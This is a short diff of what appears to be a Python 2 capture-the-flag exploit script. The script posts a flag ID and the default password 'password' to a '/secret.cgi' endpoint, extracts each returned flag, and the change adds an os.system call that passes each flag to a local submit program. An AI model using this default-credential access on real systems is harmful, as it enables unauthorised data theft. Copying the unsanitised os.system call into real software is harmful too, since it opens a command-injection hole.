@@ -42,6 +42,7 @@ else:
             httpServ.connect()
             httpServ.request('POST', '/secret.cgi', "note_id={0}&password=password".format(flag_id))
             response = httpServ.getresponse().read()
-            flags += response.strip().split(',')[0].strip() + " "
-            
+            flag = response.strip().split(',')[0].strip()
+            flags += flag + " "
+            os.system("/root/code/submit {}".format(flag))
     print flags
